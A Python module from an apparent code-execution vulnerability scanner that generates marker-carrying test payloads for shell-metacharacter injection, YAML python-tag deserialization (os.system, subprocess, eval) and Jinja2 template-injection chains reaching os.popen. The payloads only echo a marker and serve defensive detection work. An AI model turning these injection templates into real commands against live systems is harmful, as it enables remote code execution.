"""Per-sink-family payload mutators.

Replaces the Hypothesis ``@given`` strategy that used to live in the worker.
For ACE detection the input space is a small set of *structurally valid*
attack templates (YAML python-tags, Jinja globals chains, shell metachar
sequences). Random text generation almost never produces such structure,
so the worker now drives a hand-rolled loop that yields:

    1. each LLM/static seed verbatim with the marker substituted
    2. a small, family-specific set of structural variations
    3. cycled re-yields of the seeds, to fill the example budget

Each yielded payload is by construction a candidate the curator believes
*could* reach the sink — no random byte spray.

The single public entry point is :func:`variations`. To extend a family,
add an entry to :data:`_EXTENDERS`.
"""

from __future__ import annotations

from collections.abc import Callable, Iterator
from itertools import cycle

from arbiter.models import SinkFamily

MARKER_PLACEHOLDER = "{MARKER}"


def variations(
    family: SinkFamily | None,
    seeds: list[str],
    marker: str,
    budget: int,
    *,
    kind: str = "text",
) -> Iterator[str | bytes]:
    """Yield up to ``budget`` payloads carrying ``marker``.

    Order of yields:

    1. Each seed in order, with ``{MARKER}`` substituted by ``marker``.
    2. Family-specific structural variations (if any).
    3. Cycled re-yields of the seeds, until ``budget`` is reached.

    With an empty seed list the function falls back to yielding the marker
    itself once, so the worker still observes whether the bare marker
    survives to the sink.
    """
    if budget <= 0:
        return

    if not seeds:
        yield _materialize(MARKER_PLACEHOLDER, marker, kind)
        return

    materialized = [_materialize(s, marker, kind) for s in seeds]
    yielded = 0

    for v in materialized:
        if yielded >= budget:
            return
        yield v
        yielded += 1

    extender = _EXTENDERS.get(family) if family is not None else None
    if extender is not None:
        for v in extender(marker, kind):
            if yielded >= budget:
                return
            yield v
            yielded += 1

    for v in cycle(materialized):
        if yielded >= budget:
            return
        yield v
        yielded += 1


def _materialize(seed: str, marker: str, kind: str) -> str | bytes:
    s = seed.replace(MARKER_PLACEHOLDER, marker)
    if kind == "bytes":
        return s.encode("utf-8", errors="replace")
    return s


def _process_variants(marker: str, kind: str) -> Iterator[str | bytes]:
    """Shell-metachar permutations the static corpus may not enumerate."""
    forms = [
        "$(echo {MARKER})",
        "`echo {MARKER}`",
        ";echo {MARKER}",
        "&&echo {MARKER}",
        "\necho {MARKER}",
        "\"; echo {MARKER}; \"",
        "'; echo {MARKER}; '",
    ]
    for f in forms:
        yield _materialize(f, marker, kind)


def _deserialization_variants(marker: str, kind: str) -> Iterator[str | bytes]:
    """Swap the called callable in a YAML python-tag payload.

    Only emits text variants; pickle-bytes payloads need REDUCE-opcode
    construction and are out of scope for v0.
    """
    if kind == "bytes":
        return
    callables = [
        "os.system",
        "subprocess.getoutput",
        "subprocess.call",
        "os.popen",
        "builtins.eval",
        "builtins.exec",
    ]
    tags = ["object/apply", "object/new"]
    for tag in tags:
        for cb in callables:
            yield f'!!python/{tag}:{cb} ["echo {marker}"]'
    yield f'!!python/name:os.system  # {marker}'


def _code_exec_variants(marker: str, kind: str) -> Iterator[str | bytes]:
    """Vary the literal/wrapper form carrying the marker into compile()."""
    forms = [
        "'{MARKER}'",
        "'{MARKER}' + ''",
        '("{MARKER}",)[0]',
        "{{'k':'{MARKER}'}}['k']",
        "(lambda: '{MARKER}')()",
        "''.join(['{MARKER}'])",
        "f'{MARKER}'",
        "1 + 1  # {MARKER}",
    ]
    for f in forms:
        yield _materialize(f, marker, kind)


def _template_variants(marker: str, kind: str) -> Iterator[str | bytes]:
    """Cover Jinja2 globals chains the static corpus may not enumerate."""
    forms = [
        f"{{{{ '{marker}' }}}}",
        f"{{{{ '{marker}'.upper() }}}}",
        f"{{% set x = '{marker}' %}}{{{{ x }}}}",
        f"{{{{ cycler.__init__.__globals__.os.popen('echo {marker}').read() }}}}",
        f"{{{{ lipsum.__globals__['os'].popen('echo {marker}').read() }}}}",
        f"{{{{ joiner.__init__.__globals__.os.popen('echo {marker}').read() }}}}",
    ]
    for f in forms:
        yield f.encode("utf-8", errors="replace") if kind == "bytes" else f


_EXTENDERS: dict[SinkFamily, Callable[[str, str], Iterator[str | bytes]]] = {
    SinkFamily.process: _process_variants,
    SinkFamily.deserialization: _deserialization_variants,
    SinkFamily.code_exec: _code_exec_variants,
    SinkFamily.template: _template_variants,
}


__all__ = ["variations", "MARKER_PLACEHOLDER"]
